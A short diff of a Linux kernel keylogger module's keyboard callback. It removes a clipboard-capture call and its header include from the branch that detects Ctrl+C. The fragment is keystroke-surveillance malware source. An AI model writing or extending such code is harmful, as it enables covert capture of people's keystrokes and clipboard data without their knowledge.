@@ -2,7 +2,6 @@
 #include "struct_keylogger.h"
 #include "keycode_to_string.h"
 #include "flush.h"
-#include "clipboard.h"
 
 
  int keyboard_callback(struct notifier_block* nb,unsigned long action, void *data)
@@ -35,8 +34,6 @@
     if((tmp[0]=='c'||tmp[0]=='C')&&ctrl_pressed==true)
     {
         pr_info("Ctrl+C detected, capturing clipboard...\n");
-
-       queue_clipboard_capture(); 
 
         return NOTIFY_OK;
     }
